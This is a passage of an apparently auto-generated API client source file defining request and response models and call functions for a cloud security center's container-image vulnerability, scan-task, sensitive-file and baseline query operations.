*   **1**: The task is running.
*   **2**: The task is successful.
*   **3**: The task failed.', example='1'),
}

model DescribeImageFixTaskResponseBody = {
  buildTasks?: [ 
    {
      buildTaskId?: string(name='BuildTaskId', description='The ID of the task.', example='ivf-939536b5-c3ca-427b-8183-91007756'),
      finishTime?: string(name='FinishTime', description='The timestamp when the task starts. Unit: milliseconds.', example='2021-10-14 20:34:07'),
      fixTime?: string(name='FixTime', description='The timestamp when the task ends. Unit: milliseconds.', example='2021-10-14 20:32:05'),
      newTag?: string(name='NewTag', description='The version of the image after image risks are fixed.', example='redhat8-vault'),
      newUuid?: string(name='NewUuid', description='The UUID of the image after image risks are fixed.', example='2fa731681911ae8d1b5f11893ace****'),
      oldTag?: string(name='OldTag', description='The version of the image.', example='centos8.1-ja'),
      oldUuid?: string(name='OldUuid', description='The UUID of the image.', example='2fa731681911ae8d1b5f11893ace****'),
      regionId?: string(name='RegionId', description='The region of the image.', example='cn-hangzhou'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='test-redhat'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace of the image.', example='name-002'),
      status?: int32(name='Status', description='The status of the task. Valid values:

*   **1**: The task is running.
*   **2**: The task is successful.
*   **3**: The task failed.', example='2'),
      taskType?: string(name='TaskType', description='The type of the task. The value is fixed as IMAGE_REPAIR, which indicates a task that fixes image risks.', example='IMAGE_REPAIR'),
    }
  ](name='BuildTasks', description='An array that consists of the tasks returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of tasks returned on the current page.', example='12'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of tasks returned.', example='12'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8AC52BBA-85D3-5F64-9B48-D08437CAF916'),
}

model DescribeImageFixTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageFixTaskResponseBody(name='body'),
}

async function describeImageFixTaskWithOptions(request: DescribeImageFixTaskRequest, runtime: Util.RuntimeOptions): DescribeImageFixTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageFixTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageFixTask(request: DescribeImageFixTaskRequest): DescribeImageFixTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageFixTaskWithOptions(request, runtime);
}

model DescribeImageGroupedVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='High severity vulnerability that affects org.eclipse.jetty:jetty-server'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c60b77fe62093480db6164a3c2fa5****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.', example='CVE-2017-15420'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='1311'),
  imageDigest?: string(name='ImageDigest', description='The SHA-256 value of the image digest.', example='w213412341dfsfasdfafadfasfasf'),
  imageLayer?: string(name='ImageLayer', description='The layer of the image.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1c587'),
  imageTag?: string(name='ImageTag', description='The tag that is added to the image.', example='oval'),
  isLatest?: int32(name='IsLatest', description='Specifies whether to query the vulnerabilities in the latest images. If you do not specify this parameter, the vulnerabilities in all images are queried. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  patchId?: long(name='PatchId', description='The ID of the patch that is used to fix the vulnerability.', example='1341512412'),
  repoId?: string(name='RepoId', description='The ID of the image repository.', example='qew****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
  type?: string(name='Type', description='The type of the vulnerability that you want to query. Valid values:

*   **cve**: image system vulnerability
*   **sca**: image application vulnerability', example='cve'),
  uuids?: string(name='Uuids', description='The UUIDs of the assets. Separate multiple UUIDs with commas (,).', example='uuid-13134124****'),
}

model DescribeImageGroupedVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3075-Important: wget security update'),
      asapCount?: int32(name='AsapCount', description='The number of vulnerabilities that have the high priority.', example='26'),
      gmtLast?: long(name='GmtLast', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1611201274000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1611201274000'),
      laterCount?: int32(name='LaterCount', description='The number of vulnerabilities that have the medium priority.', example='26'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:9:CVE-2019-3858'),
      nntfCount?: int32(name='NntfCount', description='The number of vulnerabilities that have the low priority.', example='29'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='0'),
      tags?: string(name='Tags', description='The tag that is added to the vulnerability. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='EXP exists'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: image system vulnerability
*   **sca**: image application vulnerability', example='cve'),
    }
  ](name='GroupedVulItems', description='An array that consists of the image vulnerabilities.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5E244439-UJND-8BF7-26F36E21B9AA'),
  totalCount?: int32(name='TotalCount', description='The total number of image system vulnerabilities.', example='21'),
}

model DescribeImageGroupedVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageGroupedVulListResponseBody(name='body'),
}

async function describeImageGroupedVulListWithOptions(request: DescribeImageGroupedVulListRequest, runtime: Util.RuntimeOptions): DescribeImageGroupedVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.isLatest)) {
    query['IsLatest'] = request.isLatest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.patchId)) {
    query['PatchId'] = request.patchId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageGroupedVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageGroupedVulList(request: DescribeImageGroupedVulListRequest): DescribeImageGroupedVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageGroupedVulListWithOptions(request, runtime);
}

model DescribeImageInfoListRequest {
  uuids?: string(name='Uuids', example='391abd09184cbd3743d7f5ec125d****,
e6aeb2a5b6004479398b0bcd1160****'),
}

model DescribeImageInfoListResponseBody = {
  imageInfos?: [ 
    {
      alarmCount?: int32(name='AlarmCount', example='10'),
      alarmStatus?: string(name='AlarmStatus', example='YES'),
      digest?: string(name='Digest', example='a3521b04dfdd1361a24be6263f2983cf12ba910989f4d9f7324da7e1e89f****'),
      endpoints?: string(name='Endpoints', example='cn-hangzhou-x7'),
      imageCreate?: long(name='ImageCreate', example='1636962328000'),
      imageId?: string(name='ImageId', example='bb0175afea16138815a8900adeeb0315d88a83a2376eeffa14db1d693a15****'),
      imageSize?: long(name='ImageSize', example='157408623'),
      imageUpdate?: long(name='ImageUpdate', example='1636974116000'),
      instanceId?: string(name='InstanceId', example='i-wz95abw6pa7y79ve****'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', example='harbor'),
      repoId?: string(name='RepoId', example='crr-5qk9v2rdt0s****'),
      repoName?: string(name='RepoName', example='opa-test'),
      repoNamespace?: string(name='RepoNamespace', example='libssh2'),
      repoType?: string(name='RepoType', example='PUBLIC'),
      riskStatus?: string(name='RiskStatus', example='YES'),
      status?: string(name='Status', example='NORMAL'),
      tag?: string(name='Tag', example='v1'),
      tagImmutable?: int32(name='TagImmutable', example='0'),
      uuid?: string(name='Uuid', example='ff9ca084-7faa-4ab2-8728-69024755****'),
      vulCount?: int32(name='VulCount', example='1'),
      vulStatus?: string(name='VulStatus', example='YES'),
    }
  ](name='ImageInfos'),
  requestId?: string(name='RequestId', example='BC3B0DAE-CC0E-59E9-9383-6F060F22****'),
}

model DescribeImageInfoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageInfoListResponseBody(name='body'),
}

async function describeImageInfoListWithOptions(request: DescribeImageInfoListRequest, runtime: Util.RuntimeOptions): DescribeImageInfoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageInfoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageInfoList(request: DescribeImageInfoListRequest): DescribeImageInfoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageInfoListWithOptions(request, runtime);
}

model DescribeImageInstancesRequest {
  criteria?: string(name='Criteria', example='[{"name":"instanceId","value":"390100182","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', example='1'),
  logicalExp?: string(name='LogicalExp', example='OR'),
  pageSize?: int32(name='PageSize', example='20'),
  scanned?: boolean(name='Scanned', example='true'),
}

model DescribeImageInstancesResponseBody = {
  imageInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', example='0'),
      alarmStatus?: string(name='AlarmStatus', example='NO'),
      deployed?: int32(name='Deployed', example='1'),
      digest?: string(name='Digest', example='a5ccdd9b166b67e02954aa9b618fe19b7968bd56a15463d2ad7f2643ba5b****'),
      endpoints?: string(name='Endpoints', example='[]'),
      hcCount?: int32(name='HcCount', example='0'),
      hcStatus?: string(name='HcStatus', example='NO'),
      imageCreate?: string(name='ImageCreate', example='1600069948849'),
      imageId?: string(name='ImageId', example='c20987f18b130f9d144c9828df630417e2a9523148930dc3963e9d0dab30****'),
      imageSize?: string(name='ImageSize', example='1604487690'),
      imageUpdate?: string(name='ImageUpdate', example='1600069948849'),
      instanceId?: string(name='InstanceId', example='39010****'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', example='acr'),
      repoId?: string(name='RepoId', example='f2b86d20bf0855af6aa268ce90fd****'),
      repoName?: string(name='RepoName', example='sas-script-test'),
      repoNamespace?: string(name='RepoNamespace', example='N/A'),
      repoType?: string(name='RepoType', example='private'),
      riskStatus?: string(name='RiskStatus', example='NO'),
      scaProgress?: int32(name='ScaProgress', example='100'),
      scaResult?: string(name='ScaResult', example='TASK_NOT_SUPPORT_REGION'),
      scaStatus?: string(name='ScaStatus', example='SUCCESS'),
      status?: string(name='Status', example='NORMAL'),
      tag?: string(name='Tag', example='mysql_5.7'),
      uuid?: string(name='Uuid', example='12f80307-60aa-4efa-863a-56d72fb****'),
      vulCount?: int32(name='VulCount', example='0'),
      vulStatus?: string(name='VulStatus', example='NO'),
    }
  ](name='ImageInstanceList'),
  pageInfo?: {
    count?: int32(name='Count', example='4'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='69'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeImageInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageInstancesResponseBody(name='body'),
}

async function describeImageInstancesWithOptions(request: DescribeImageInstancesRequest, runtime: Util.RuntimeOptions): DescribeImageInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanned)) {
    query['Scanned'] = request.scanned;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageInstances(request: DescribeImageInstancesRequest): DescribeImageInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageInstancesWithOptions(request, runtime);
}

model DescribeImageLatestScanTaskRequest {
  digest?: string(name='Digest', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
}

model DescribeImageLatestScanTaskResponseBody = {
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  task?: [ 
    {
      create?: string(name='Create', example='2022-12-20 11:59:05'),
      finish?: int32(name='Finish', example='100'),
      finishTime?: long(name='FinishTime', example='1669693430977'),
      id?: long(name='Id', example='9755662'),
      modified?: string(name='Modified', example='2022-12-20 12:00:05'),
      name?: string(name='Name', example='IMAGE_SCAN'),
      source?: string(name='Source', example='console_batch'),
      startTime?: long(name='StartTime', example='1668614400000'),
      status?: string(name='Status', example='SUCCESS'),
      target?: string(name='Target', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
      targetType?: string(name='TargetType', example='IMAGE'),
      taskId?: string(name='TaskId', example='0a960b9a48b788a8689154b032bf****'),
      taskType?: string(name='TaskType', example='IMAGE_SCAN'),
    }
  ](name='Task'),
}

model DescribeImageLatestScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageLatestScanTaskResponseBody(name='body'),
}

async function describeImageLatestScanTaskWithOptions(request: DescribeImageLatestScanTaskRequest, runtime: Util.RuntimeOptions): DescribeImageLatestScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageLatestScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageLatestScanTask(request: DescribeImageLatestScanTaskRequest): DescribeImageLatestScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageLatestScanTaskWithOptions(request, runtime);
}

model DescribeImageListBySensitiveFileRequest {
  currentPage?: int32(name='CurrentPage'),
  imageDigest?: string(name='ImageDigest'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  repoInstanceId?: string(name='RepoInstanceId'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  riskLevel?: string(name='RiskLevel'),
  scanRange?: [ string ](name='ScanRange'),
  sensitiveFileKey?: string(name='SensitiveFileKey'),
}

model DescribeImageListBySensitiveFileShrinkRequest {
  currentPage?: int32(name='CurrentPage'),
  imageDigest?: string(name='ImageDigest'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  repoInstanceId?: string(name='RepoInstanceId'),
  repoName?: string(name='RepoName'),
  repoNamespace?: string(name='RepoNamespace'),
  riskLevel?: string(name='RiskLevel'),
  scanRangeShrink?: string(name='ScanRange'),
  sensitiveFileKey?: string(name='SensitiveFileKey'),
}

model DescribeImageListBySensitiveFileResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  imageInfos?: [ 
    {
      digest?: string(name='Digest'),
      firstScanTime?: long(name='FirstScanTime'),
      instanceId?: string(name='InstanceId'),
      lastScanTime?: long(name='LastScanTime'),
      regionId?: string(name='RegionId'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      riskLevel?: string(name='RiskLevel'),
      tag?: string(name='Tag'),
      uuid?: string(name='Uuid'),
    }
  ](name='ImageInfos'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    lastRowKey?: string(name='LastRowKey'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model DescribeImageListBySensitiveFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageListBySensitiveFileResponseBody(name='body'),
}

async function describeImageListBySensitiveFileWithOptions(tmpReq: DescribeImageListBySensitiveFileRequest, runtime: Util.RuntimeOptions): DescribeImageListBySensitiveFileResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageListBySensitiveFileShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListBySensitiveFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageListBySensitiveFile(request: DescribeImageListBySensitiveFileRequest): DescribeImageListBySensitiveFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListBySensitiveFileWithOptions(request, runtime);
}

model DescribeImageListWithBaselineNameRequest {
  baselineNameKey?: string(name='BaselineNameKey', description='The name of the image baseline.', example='ak_leak'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='c08d5fc1a329a4b88950a253d082f****'),
  criteria?: string(name='Criteria', description='The search condition for the image baseline.', example='Unauthorized access'),
  criteriaType?: string(name='CriteriaType', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='BaselineNameAlias'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  image?: string(name='Image', description='The name of the image to which the container belongs.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  imageDigest?: string(name='ImageDigest', description='The SHA-256 value of the image digest.', example='2e6daffce524ffeae66cccaa90c8fc47de912346dcec295c27395b6d66db6423'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeImageListWithBaselineNameResponseBody = {
  imageInfos?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The SHA-256 value of the image digest.', example='2e6daffce524ffeae66cccaa90c8fc47de912346dcec295c27395b6d66db6423'),
      highRiskImage?: int32(name='HighRiskImage', description='The number of images on which **high** baseline risks are detected.', example='1'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageCreate?: long(name='ImageCreate', description='The timestamp when the image was created. Unit: milliseconds.', example='1636962328000'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='cddb5fd33b34a1fabb358d0a19497cdfe362fe624821cb250947af0ea5cc****'),
      imageSize?: int32(name='ImageSize', description='The size of the image.', example='157408623'),
      imageUpdate?: long(name='ImageUpdate', description='The timestamp when the image was updated. Unit: milliseconds.', example='1636974116000'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='cri-a595qp31knh9****'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      lastScanTime?: long(name='LastScanTime'),
      lowRiskImage?: int32(name='LowRiskImage', description='The number of images on which **low** baseline risks are detected.', example='0'),
      middleRiskImage?: int32(name='MiddleRiskImage', description='The number of images on which **medium** baseline risks are detected.', example='0'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      noRiskImage?: int32(name='NoRiskImage', description='The number of images that do not have baseline risks.', example='0'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      regionId?: string(name='RegionId', description='The region ID of the image instance.', example='cn-beijing'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-1lt6q7167yh6****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='scanner'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      repoType?: string(name='RepoType', description='The type of the image repository.', example='PRIVATE'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether the image is at risk. Valid values:

*   **YES**
*   **NO**', example='YES'),
      tag?: string(name='Tag', description='The version of the image.', example='v1'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
      totalItemCount?: int32(name='TotalItemCount', description='The total number of risk items that are detected on the image by using the baseline.', example='3'),
      uuid?: string(name='Uuid', description='The UUID of the image.', example='f58681174f944623345379e23b7b****'),
    }
  ](name='ImageInfos', description='An array that consists of the images returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of the images returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of images on which baseline risks are detected.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5B8C2156-2DB9-5A42-99E7-F2ED5AE9EA1F'),
}

model DescribeImageListWithBaselineNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageListWithBaselineNameResponseBody(name='body'),
}

async function describeImageListWithBaselineNameWithOptions(request: DescribeImageListWithBaselineNameRequest, runtime: Util.RuntimeOptions): DescribeImageListWithBaselineNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineNameKey)) {
    query['BaselineNameKey'] = request.baselineNameKey;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
